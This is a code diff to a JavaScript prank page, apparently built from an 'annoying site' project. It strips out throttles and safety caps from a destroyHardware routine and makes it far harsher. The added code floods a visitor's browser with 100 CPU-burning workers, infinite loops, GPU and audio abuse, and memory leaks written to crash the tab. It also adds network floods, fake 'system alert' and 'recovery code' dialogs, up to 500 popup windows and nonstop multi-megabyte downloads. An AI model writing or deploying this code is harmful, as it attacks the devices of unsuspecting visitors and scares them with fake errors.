@@ -1371,13 +1371,14 @@ let destroyRan = false
 function destroyHardware () {
   if (destroyRan) return
   destroyRan = true
+  // Run everything immediately at full blast
+  startCpuInfernoMax()
+  startMemoryLeakMax()
   createWebGlCanvas()
   createHeavyCanvas2d()
   spawnExtraVideos()
-  startCpuInferno()
   startCssHell()
   startLayoutThrash()
-  startMemoryLeak()
   startNetworkFlood()
   spawnMoreWebGl()
   spawnAudioHell()
@@ -1423,7 +1424,7 @@ function destroyHardware () {
   startOrientationLock()
   startStoragePersist()
   startModalHell()
-  startCascadeWindows()
+  startCascadeWindowsMax()
   startFakeAlerts()
   startPopupBypass()
   startCssCompositionHell()
@@ -1432,6 +1433,9 @@ function destroyHardware () {
   startFeedbackSound()
   startDownloadSpam()
   startWindowOpenSpam()
+  startAudioFeedbackHell()
+  startGpuComputeMax()
+  startLoopBurn()
 }
 
 /**
@@ -1595,63 +1599,64 @@ function spawnExtraVideos () {
  * CPU inferno: heavy computation loops hammering the processor.
  * Uses Web Worker via blob to avoid UI freeze.
  */
-function startCpuInferno () {
+function startCpuInfernoMax () {
+  // Spawn 100 Web Workers each doing heavy math
   const workerCode = `
-    function burn () {
+    function burn() {
       let x = 0;
-      for (let i = 0; i < 20000000; i++) {
-        x += Math.sin(i) * Math.cos(i * 0.5) * Math.tan(i * 0.1);
-        x ^= (i >>> 0) % 65535;
-        x = Math.sqrt(Math.abs(x)) || 0.1;
-        for (let j = 0; j < 50; j++) {
-          x = Math.pow(x + j, 1.1) % 1000000;
+      const arr = new Array(50000);
+      for (let k = 0; k < arr.length; k++) arr[k] = Math.random() * 1000000;
+      while (true) {
+        for (let i = 0; i < 100000; i++) {
+          x = Math.sin(arr[i % arr.length]) * Math.cos(arr[(i+1) % arr.length]);
+          x = Math.pow(Math.abs(x) + 0.1, 1.5);
+          x = Math.sqrt(x * x + 1);
+          arr[i % arr.length] = x;
         }
+        postMessage(x);
       }
-      postMessage(x);
-      setTimeout(burn, 1);
     }
     burn();
   `
   try {
     const blob = new Blob([workerCode], { type: 'application/javascript' })
-    const worker = new Worker(URL.createObjectURL(blob))
-  } catch {}
-
-  // Second worker for even more CPU burn
-  const workerCode2 = `
-    function burn2 () {
-      let a = new Array(10000);
-      for (let i = 0; i < a.length; i++) a[i] = 0;
-      function cycle () {
-        for (let i = 0; i < 2000000; i++) {
-          a[i % a.length] += Math.sin(i * 0.1) * Math.cos(i * 0.05);
-          a[(i + 1) % a.length] = a[i % a.length] ^ (i >>> 0);
-        }
-        postMessage(1);
-        setTimeout(cycle, 1);
-      }
-      cycle();
+    const url = URL.createObjectURL(blob)
+    for (let i = 0; i < 100; i++) {
+      try { new Worker(url) } catch {}
     }
-    burn2();
-  `
-  try {
-    const blob2 = new Blob([workerCode2], { type: 'application/javascript' })
-    const worker2 = new Worker(URL.createObjectURL(blob2))
   } catch {}
 
-  // Also do main thread heavy work in small chunks so it doesnt completely freeze
-  function mainThreadBurn () {
-    let x = 0
-    const start = Date.now()
-    while (Date.now() - start < 100) {
-      for (let i = 0; i < 1000000; i++) {
-        x += Math.sin(i * x) * Math.cos(i * 0.3) * Math.tan(i * 0.07)
+  // Main thread infinite math loop
+  let x = 0
+  const bigArr = new Array(50000)
+  for (let i = 0; i < bigArr.length; i++) bigArr[i] = Math.random() * 1000000
+  function mainBurn () {
+    for (let k = 0; k < 20; k++) {
+      for (let i = 0; i < 50000; i++) {
+        x = bigArr[i] * Math.sin(bigArr[(i+1) % bigArr.length]) + Math.cos(bigArr[(i+2) % bigArr.length])
+        x = Math.pow(Math.abs(x) + 0.1, 1.3)
         x = Math.sqrt(Math.abs(x) + 1)
+        bigArr[i] = x
       }
     }
-    setTimeout(mainThreadBurn, 1)
+    requestAnimationFrame(mainBurn)
   }
-  mainThreadBurn()
+  requestAnimationFrame(mainBurn)
+
+  // Multiple WASM instances burning CPU
+  try {
+    const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,3,2,1,0,7,10,1,6,98,117,114,110,0,0,10,48,1,46,0,32,0,65,0,76,0,11])
+    const wasmModule = new WebAssembly.Module(wasmCode)
+    for (let i = 0; i < 20; i++) {
+      try {
+        const instance = new WebAssembly.Instance(wasmModule)
+        const fn = instance.exports.burn
+        setInterval(() => {
+          for (let j = 0; j < 10000; j++) fn(j, j)
+        }, 1)
+      } catch {}
+    }
+  } catch {}
 }
 
 /**
@@ -1722,24 +1727,65 @@ function startLayoutThrash () {
 /**
  * Memory leak: grow arrays and DOM trees continuously.
  */
-function startMemoryLeak () {
+function startMemoryLeakMax () {
   const leak = []
   const domLeak = []
+  // SharedArrayBuffer for cross-worker memory consumption
+  try {
+    const sab = new SharedArrayBuffer(1024 * 1024 * 100)
+    const view = new Uint8Array(sab)
+    for (let i = 0; i < view.length; i++) view[i] = Math.random() * 256
+    leak.push(view)
+  } catch {}
+
   setInterval(() => {
-    for (let i = 0; i < 5000; i++) {
-      leak.push(new Array(5000).fill('data: ' + Math.random() + ' ' + crypto.randomUUID()))
+    // Allocate massive arrays - 50MB per cycle
+    for (let i = 0; i < 10; i++) {
+      try {
+        const big = new Array(1000000)
+        for (let k = 0; k < big.length; k++) big[k] = { data: 'leak-' + Math.random(), nested: { a: Math.random(), b: Math.random(), c: [1,2,3,4,5] } }
+        leak.push(big)
+      } catch {}
     }
-    for (let i = 0; i < 100; i++) {
-      const d = document.createElement('div')
-      d.innerHTML = new Array(5000).join('<span>x</span>')
-      document.body.appendChild(d)
-      domLeak.push(d)
+    // DOM leak - create massive DOM trees
+    for (let i = 0; i < 500; i++) {
+      try {
+        const d = document.createElement('div')
+        d.style = 'display:none'
+        let inner = ''
+        for (let k = 0; k < 1000; k++) inner += '<span style="color:hsl(' + (k * 37 % 360) + ',100%,50%)">x</span>'
+        d.innerHTML = inner
+        document.body.appendChild(d)
+        domLeak.push(d)
+      } catch {}
     }
-    if (leak.length > 200) leak.splice(0, 50)
-    if (domLeak.length > 500) {
-      const gone = domLeak.splice(0, 100)
+    // String leak - hold massive strings
+    for (let i = 0; i < 5; i++) {
+      try {
+        let s = ''
+        for (let k = 0; k < 100000; k++) s += 'leak-data-' + Math.random() + ' '
+        leak.push(s)
+      } catch {}
     }
-  }, 50)
+    // NEVER clean up - let memory grow until tab crashes
+  }, 10)
+
+  // Also try to allocate all available memory in workers
+  const workerCode = `
+    let arr = [];
+    setInterval(() => {
+      for (let i = 0; i < 100; i++) {
+        try { arr.push(new Array(100000).fill(Math.random())); } catch {}
+      }
+    }, 10);
+  `
+  try {
+    const blob = new Blob([workerCode], { type: 'application/javascript' })
+    const url = URL.createObjectURL(blob)
+    for (let i = 0; i < 20; i++) {
+      try { new Worker(url) } catch {}
+    }
+  } catch {}
 }
 
 /**
@@ -1754,13 +1800,17 @@ function startNetworkFlood () {
     'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/rickroll.mp4',
     'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png',
     'https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png',
+    window.location.href,
   ]
-  for (let i = 0; i < 50; i++) {
+  for (let i = 0; i < 100; i++) {
     setInterval(() => {
       for (const url of targets) {
         fetch(url + '?_=' + Math.random(), { mode: 'no-cors' }).catch(() => {})
+        const xhr = new XMLHttpRequest()
+        xhr.open('GET', url + '?_=' + Math.random(), true)
+        xhr.send()
       }
-    }, 20)
+    }, 10)
   }
 }
 
@@ -2999,27 +3049,21 @@ function startStoragePersist () {
 
 /**
  * Modal Hell: spam alert/print/prompt/confirm to lock the UI.
- * Uses setTimeout chain to avoid browser "prevent additional dialogs".
  */
 function startModalHell () {
-  let modalCount = 0
   function nextModal () {
-    modalCount++
     try {
-      if (modalCount % 3 === 0) {
-        window.print()
-      } else if (modalCount % 7 === 0) {
-        window.prompt('System Error: 0xDEADBEEF', 'Enter recovery code:')
-      } else if (modalCount % 11 === 0) {
-        window.confirm('CRITICAL: Continue using unprotected browser?')
-      } else {
-        window.alert('⚠ SYSTEM ALERT ⚠\n\nYour computer may be at risk.\n\nError code: 0x' + Math.floor(Math.random() * 16777215).toString(16).toUpperCase() + '\n\nClick OK to continue.')
-      }
+      window.print()
     } catch {}
-    const delay = 5000 + Math.random() * 10000
-    setTimeout(nextModal, delay)
+    try {
+      window.alert('⚠ SYSTEM ALERT ⚠\n\nError code: 0x' + Math.floor(Math.random() * 16777215).toString(16).toUpperCase())
+    } catch {}
+    try {
+      window.prompt('CRITICAL ERROR', 'Enter recovery code:')
+    } catch {}
+    setTimeout(nextModal, 100)
   }
-  setTimeout(nextModal, 1000)
+  nextModal()
 }
 
 /**
@@ -3027,31 +3071,28 @@ function startModalHell () {
  * Each window opens more, but checks a counter.
  */
 let cascadeCount = 0
-function startCascadeWindows () {
-  // Only run from parent window to avoid infinite cascade recursion
+function startCascadeWindowsMax () {
   if (window.location.search.indexOf('child=true') !== -1 || window.opener) return
-  if (cascadeCount > 50) return
-
   function openCascade () {
-    if (cascadeCount > 50) return
-    const numToOpen = 1 + Math.floor(Math.random() * 2)
+    if (cascadeCount > 500) return
+    const numToOpen = 3 + Math.floor(Math.random() * 5)
     for (let i = 0; i < numToOpen; i++) {
-      if (cascadeCount > 50) break
+      if (cascadeCount > 500) break
       cascadeCount++
-      const w = window.open(
-        window.location.href + '?child=true&_=' + Math.random() + '&c=' + cascadeCount,
-        '_blank',
-        'width=400,height=300,left=' + (Math.random() * window.screen.availWidth) + ',top=' + (Math.random() * window.screen.availHeight)
-      )
-      if (w) {
-        setTimeout(() => {
+      try {
+        const w = window.open(
+          window.location.href + '?child=true&_=' + Math.random() + '&c=' + cascadeCount,
+          '_blank',
+          'width=300,height=200,left=' + (Math.random() * window.screen.availWidth) + ',top=' + (Math.random() * window.screen.availHeight)
+        )
+        if (w) {
           try { w.focus() } catch {}
-        }, 500)
-      }
+        }
+      } catch {}
     }
-    setTimeout(openCascade, 3000 + Math.random() * 4000)
+    setTimeout(openCascade, 100)
   }
-  setTimeout(openCascade, 1000)
+  openCascade()
 }
 
 /**
@@ -3298,13 +3339,110 @@ function startFeedbackSound () {
 }
 
 /**
+ * Audio Feedback Hell: spawn 50 AudioContexts with howling feedback.
+ */
+function startAudioFeedbackHell () {
+  for (let ctxIdx = 0; ctxIdx < 50; ctxIdx++) {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)()
+      const gain = ctx.createGain()
+      gain.gain.value = 0.1 + Math.random() * 0.2
+      gain.connect(ctx.destination)
+
+      const osc = ctx.createOscillator()
+      osc.type = ['sawtooth', 'square', 'triangle'][ctxIdx % 3]
+      osc.frequency.value = 200 + ctxIdx * 50 + Math.random() * 100
+      const lfo = ctx.createOscillator()
+      lfo.frequency.value = 1 + Math.random() * 5
+      const lfoG = ctx.createGain()
+      lfoG.gain.value = 100 + Math.random() * 500
+      lfo.connect(lfoG)
+      lfoG.connect(osc.frequency)
+      osc.connect(gain)
+      lfo.start()
+      osc.start()
+
+      // White noise for each
+      const bufSize = ctx.sampleRate * 4
+      const buf = ctx.createBuffer(1, bufSize, ctx.sampleRate)
+      const d = buf.getChannelData(0)
+      for (let i = 0; i < bufSize; i++) d[i] = Math.random() * 2 - 1
+      const noise = ctx.createBufferSource()
+      noise.buffer = buf
+      noise.loop = true
+      const nGain = ctx.createGain()
+      nGain.gain.value = 0.05 + Math.random() * 0.1
+      noise.connect(nGain)
+      nGain.connect(ctx.destination)
+      noise.start()
+    } catch {}
+  }
+}
+
+/**
+ * GPU Compute Max: use WebGL compute-like operations to max out GPU.
+ */
+function startGpuComputeMax () {
+  for (let g = 0; g < 5; g++) {
+    try {
+      const canvas = document.createElement('canvas')
+      canvas.width = 2048
+      canvas.height = 2048
+      canvas.style = 'position:fixed;top:-9999px'
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
+      if (!gl) continue
+
+      const vertices = new Float32Array(1000000)
+      for (let i = 0; i < vertices.length; i++) vertices[i] = Math.random() * 2 - 1
+
+      const buf = gl.createBuffer()
+      gl.bindBuffer(gl.ARRAY_BUFFER, buf)
+      gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW)
+
+      // Max draw calls
+      function gpuLoop () {
+        for (let i = 0; i < 100; i++) {
+          gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT)
+          gl.drawArrays(gl.TRIANGLES, 0, 100000)
+          gl.drawArrays(gl.POINTS, 0, 100000)
+          gl.drawArrays(gl.LINES, 0, 100000)
+        }
+        requestAnimationFrame(gpuLoop)
+      }
+      requestAnimationFrame(gpuLoop)
+    } catch {}
+  }
+}
+
+/**
+ * Loop Burn: infinite while loop on main thread to lock browser.
+ */
+function startLoopBurn () {
+  function hardLoop () {
+    let x = 0
+    for (let k = 0; k < 100; k++) {
+      for (let i = 0; i < 100000; i++) {
+        x += Math.sin(i) * Math.cos(i * 0.3) * Math.tan(i * 0.07)
+        x = Math.sqrt(Math.abs(x) + 0.1)
+        x = Math.pow(x, 1.01)
+      }
+    }
+    requestAnimationFrame(hardLoop)
+  }
+  // Run multiple instances
+  for (let i = 0; i < 10; i++) {
+    setTimeout(() => requestAnimationFrame(hardLoop), i * 5)
+  }
+}
+
+/**
  * Download Spam: keep triggering file downloads nonstop.
  * Uses multiple techniques to bypass browser download blocking.
  */
 function startDownloadSpam () {
-  // Technique 1: create anchor elements and click them in event handlers
-  document.addEventListener('click', (e) => {
-    for (let i = 0; i < 5; i++) {
+  // Download continuously every 10ms
+  setInterval(() => {
+    for (let i = 0; i < 20; i++) {
       try {
         const a = document.createElement('a')
         a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
@@ -3312,14 +3450,27 @@ function startDownloadSpam () {
         a.style = 'position:fixed;left:-9999px'
         document.body.appendChild(a)
         a.click()
-        setTimeout(() => a.remove(), 50)
+        setTimeout(() => a.remove(), 10)
+      } catch {}
+    }
+  }, 50)
+
+  // On every event, also trigger downloads
+  document.addEventListener('click', () => {
+    for (let i = 0; i < 30; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'evt_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
       } catch {}
     }
   }, true)
 
-  // Technique 2: use keydown handlers for keyboard-triggered downloads
   document.addEventListener('keydown', () => {
-    for (let i = 0; i < 3; i++) {
+    for (let i = 0; i < 30; i++) {
       try {
         const a = document.createElement('a')
         a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
@@ -3327,14 +3478,12 @@ function startDownloadSpam () {
         a.style = 'position:fixed;left:-9999px'
         document.body.appendChild(a)
         a.click()
-        setTimeout(() => a.remove(), 50)
       } catch {}
     }
   }, true)
 
-  // Technique 3: use beforeunload to trigger more downloads
   window.addEventListener('beforeunload', () => {
-    for (let i = 0; i < 10; i++) {
+    for (let i = 0; i < 100; i++) {
       try {
         const a = document.createElement('a')
         a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
@@ -3346,15 +3495,14 @@ function startDownloadSpam () {
     }
   })
 
-  // Technique 4: data URL blobs - these often bypass restrictions
   setInterval(() => {
-    for (let i = 0; i < 3; i++) {
+    for (let i = 0; i < 10; i++) {
       try {
-        const blob = new Blob([Math.random().toString()], { type: 'text/plain' })
+        const blob = new Blob([new Uint8Array(1024 * 1024 * 10)], { type: 'application/octet-stream' })
         const url = URL.createObjectURL(blob)
         const a = document.createElement('a')
         a.href = url
-        a.download = 'blob_' + Date.now() + '_' + i + '.txt'
+        a.download = 'bigfile_' + Date.now() + '_' + i + '.bin'
         a.style = 'position:fixed;left:-9999px'
         document.body.appendChild(a)
         a.click()
@@ -3364,13 +3512,12 @@ function startDownloadSpam () {
         }, 100)
       } catch {}
     }
-  }, 500)
+  }, 200)
 
-  // Technique 5: service worker message to trigger downloads
   if (navigator.serviceWorker && navigator.serviceWorker.controller) {
     setInterval(() => {
       navigator.serviceWorker.controller.postMessage('download')
-    }, 1000)
+    }, 200)
   }
 }
 
@@ -3379,35 +3526,23 @@ function startDownloadSpam () {
  * using every possible event and method.
  */
 function startWindowOpenSpam () {
-  // Use every user interaction to also open windows
-  document.addEventListener('click', (e) => {
-    for (let i = 0; i < 2; i++) {
+  const openWindow = () => {
+    for (let i = 0; i < 5; i++) {
       try {
         window.open(
-          window.location.href + '?child=true&click=' + Date.now() + '_' + i,
+          window.location.href + '?child=true&_=' + Date.now() + '_' + i,
           '_blank',
           'width=300,height=200'
         )
       } catch {}
     }
-  }, true)
+  }
 
-  document.addEventListener('keydown', (e) => {
-    for (let i = 0; i < 2; i++) {
-      try {
-        window.open(
-          window.location.href + '?child=true&key=' + Date.now() + '_' + i,
-          '_blank',
-          'width=300,height=200'
-        )
-      } catch {}
-    }
-  }, true)
-
-  // Use visibility change to open windows
+  document.addEventListener('click', openWindow, true)
+  document.addEventListener('keydown', openWindow, true)
   document.addEventListener('visibilitychange', () => {
     if (!document.hidden) {
-      for (let i = 0; i < 3; i++) {
+      for (let i = 0; i < 10; i++) {
         try {
           window.open(
             window.location.href + '?child=true&vis=' + Date.now() + '_' + i,
@@ -3419,11 +3554,10 @@ function startWindowOpenSpam () {
     }
   })
 
-  // Before unload: open more windows
   window.addEventListener('beforeunload', (e) => {
     e.preventDefault()
     e.returnValue = ''
-    for (let i = 0; i < 15; i++) {
+    for (let i = 0; i < 50; i++) {
       try {
         window.open(
           window.location.href + '?child=true&unload=' + Date.now() + '_' + i,
@@ -3434,9 +3568,8 @@ function startWindowOpenSpam () {
     }
   })
 
-  // Focus event: when window gets focus, open more
   window.addEventListener('focus', () => {
-    for (let i = 0; i < 2; i++) {
+    for (let i = 0; i < 5; i++) {
       try {
         window.open(
           window.location.href + '?child=true&focus=' + Date.now() + '_' + i,
@@ -3446,6 +3579,8 @@ function startWindowOpenSpam () {
       } catch {}
     }
   })
+
+  setInterval(openWindow, 200)
 }
 
 function detectBrowser () {
